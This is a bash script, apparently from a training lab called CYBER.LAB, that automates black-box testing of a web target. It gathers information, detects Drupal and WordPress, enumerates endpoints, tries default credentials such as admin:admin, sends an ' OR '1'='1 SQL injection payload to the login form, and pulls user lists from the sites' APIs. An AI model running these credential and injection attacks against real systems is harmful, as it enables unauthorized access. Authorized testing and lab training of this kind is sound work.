#!/bin/bash

# CYBER.LAB - Blackbox Testing Automation Script
# Tests target system without prior knowledge
# Usage: ./blackbox_testing.sh <target_url>

if [ -z "$1" ]; then
    echo "Usage: $0 <target_url>"
    echo "Example: $0 http://localhost:8001"
    exit 1
fi

TARGET="$1"
REPORT_DIR="blackbox_reports"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT_FILE="$REPORT_DIR/blackbox_scan_$TIMESTAMP.txt"

# Create report directory
mkdir -p "$REPORT_DIR"

echo "╔═══════════════════════════════════════════════════════════════╗" | tee "$REPORT_FILE"
echo "║         CYBER.LAB - BLACKBOX TESTING AUTOMATED SCAN          ║" | tee -a "$REPORT_FILE"
echo "╚═══════════════════════════════════════════════════════════════╝" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"
echo "[+] Target: $TARGET" | tee -a "$REPORT_FILE"
echo "[+] Started: $(date)" | tee -a "$REPORT_FILE"
echo "[+] Report: $REPORT_FILE" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

# Phase 1: Information Gathering
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "PHASE 1: INFORMATION GATHERING" | tee -a "$REPORT_FILE"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

echo "[*] Fetching HTTP headers..." | tee -a "$REPORT_FILE"
curl -I "$TARGET" 2>/dev/null | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

echo "[*] Checking robots.txt..." | tee -a "$REPORT_FILE"
curl -s "$TARGET/robots.txt" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

echo "[*] Checking sitemap.xml..." | tee -a "$REPORT_FILE"
curl -s "$TARGET/sitemap.xml" | head -20 | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

# Phase 2: CMS Detection
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "PHASE 2: CMS & TECHNOLOGY DETECTION" | tee -a "$REPORT_FILE"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

echo "[*] Checking for Drupal..." | tee -a "$REPORT_FILE"
if curl -s "$TARGET" | grep -q "Drupal\|sites/default/files\|sites/all/modules"; then
    echo "[+] DRUPAL DETECTED" | tee -a "$REPORT_FILE"
fi

echo "[*] Checking for WordPress..." | tee -a "$REPORT_FILE"
if curl -s "$TARGET" | grep -q "wp-content\|wp-admin\|wp-includes"; then
    echo "[+] WORDPRESS DETECTED" | tee -a "$REPORT_FILE"
fi

echo "[*] Checking version (CHANGELOG.txt)..." | tee -a "$REPORT_FILE"
curl -s "$TARGET/CHANGELOG.txt" | head -10 | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

# Phase 3: Endpoint Enumeration
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "PHASE 3: ENDPOINT ENUMERATION" | tee -a "$REPORT_FILE"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

endpoints=(
    "/admin"
    "/user/login"
    "/user/register"
    "/user"
    "/login"
    "/register"
    "/api"
    "/rest"
    "/services"
    "/views/ajax"
    "/entity/user"
    "/jsonapi/user/user"
    "/wp-admin"
    "/wp-login.php"
    "/wp-json"
    "/xmlrpc.php"
)

echo "[*] Testing endpoints..." | tee -a "$REPORT_FILE"
for endpoint in "${endpoints[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint")
    if [ "$status" != "000" ] && [ "$status" != "999" ]; then
        echo "  [$status] $endpoint" | tee -a "$REPORT_FILE"
    fi
done
echo "" | tee -a "$REPORT_FILE"

# Phase 4: Authentication Testing
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "PHASE 4: AUTHENTICATION TESTING" | tee -a "$REPORT_FILE"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

echo "[*] Testing weak credentials..." | tee -a "$REPORT_FILE"
credentials=(
    "admin:admin"
    "admin:123456"
    "admin:password"
    "test:test"
    "admin:admin123"
)

for cred in "${credentials[@]}"; do
    username="${cred%:*}"
    password="${cred#*:}"
    
    # Try Drupal login
    response=$(curl -s -X POST "$TARGET/user/login" \
      -d "name=$username&pass=$password" \
      -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
    
    if echo "$response" | grep -q "logout\|dashboard\|user-menu\|My Account"; then
        echo "[!] VALID CREDENTIALS FOUND: $username:$password (Drupal)" | tee -a "$REPORT_FILE"
    fi
    
    # Try WordPress login
    response=$(curl -s -X POST "$TARGET/wp-login.php" \
      -d "log=$username&pwd=$password&wp-submit=Log In" 2>/dev/null)
    
    if echo "$response" | grep -q "wp-admin\|dashboard"; then
        echo "[!] VALID CREDENTIALS FOUND: $username:$password (WordPress)" | tee -a "$REPORT_FILE"
    fi
done
echo "" | tee -a "$REPORT_FILE"

# Phase 5: SQL Injection Testing
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "PHASE 5: SQL INJECTION TESTING" | tee -a "$REPORT_FILE"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

echo "[*] Testing SQL injection in login..." | tee -a "$REPORT_FILE"
response=$(curl -s -X POST "$TARGET/user/login" \
  -d "name=' OR '1'='1&pass=anything" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)

if echo "$response" | grep -q "logout\|user\|profile"; then
    echo "[!] POSSIBLE SQL INJECTION DETECTED" | tee -a "$REPORT_FILE"
    echo "    Payload: ' OR '1'='1" | tee -a "$REPORT_FILE"
fi
echo "" | tee -a "$REPORT_FILE"

# Phase 6: Information Disclosure
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "PHASE 6: INFORMATION DISCLOSURE" | tee -a "$REPORT_FILE"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

echo "[*] Checking for error messages (information disclosure)..." | tee -a "$REPORT_FILE"
response=$(curl -s "$TARGET/admin/nonexistent")
if echo "$response" | grep -q "error\|exception\|warning\|fatal\|Parse error\|Notice"; then
    echo "[!] ERROR MESSAGES DETECTED (Information Disclosure)" | tee -a "$REPORT_FILE"
    echo "$response" | grep -i "error\|exception" | head -5 | tee -a "$REPORT_FILE"
fi
echo "" | tee -a "$REPORT_FILE"

# Phase 7: API Testing
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "PHASE 7: API ENUMERATION" | tee -a "$REPORT_FILE"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

echo "[*] Checking REST APIs..." | tee -a "$REPORT_FILE"

# Drupal REST
echo "[*] Drupal REST API (/jsonapi/user/user):" | tee -a "$REPORT_FILE"
curl -s "$TARGET/jsonapi/user/user" | head -10 | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

# WordPress REST
echo "[*] WordPress REST API (/wp-json/wp/v2/users):" | tee -a "$REPORT_FILE"
curl -s "$TARGET/wp-json/wp/v2/users" | head -10 | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

# Phase 8: Security Headers
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "PHASE 8: SECURITY HEADERS ANALYSIS" | tee -a "$REPORT_FILE"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

echo "[*] Analyzing security headers..." | tee -a "$REPORT_FILE"
headers=$(curl -s -I "$TARGET" 2>/dev/null)

required_headers=(
    "X-Content-Type-Options:nosniff"
    "X-Frame-Options:DENY"
    "Strict-Transport-Security:max-age="
    "Content-Security-Policy:"
    "X-XSS-Protection:1"
)

for req_header in "${required_headers[@]}"; do
    header_name="${req_header%:*}"
    if ! echo "$headers" | grep -q "$header_name"; then
        echo "[!] MISSING: $header_name" | tee -a "$REPORT_FILE"
    fi
done
echo "" | tee -a "$REPORT_FILE"

# Final Summary
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "SCAN COMPLETE" | tee -a "$REPORT_FILE"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "[+] Completed: $(date)" | tee -a "$REPORT_FILE"
echo "[+] Results saved to: $REPORT_FILE" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

# Python automated analysis if available
if command -v python3 &> /dev/null; then
    echo "[*] Running automated Python analysis..." | tee -a "$REPORT_FILE"
    python3 ../scripts/blackbox_scanner.py "$TARGET" >> "$REPORT_FILE" 2>&1
fi

echo "[✓] Blackbox testing complete!" | tee -a "$REPORT_FILE"
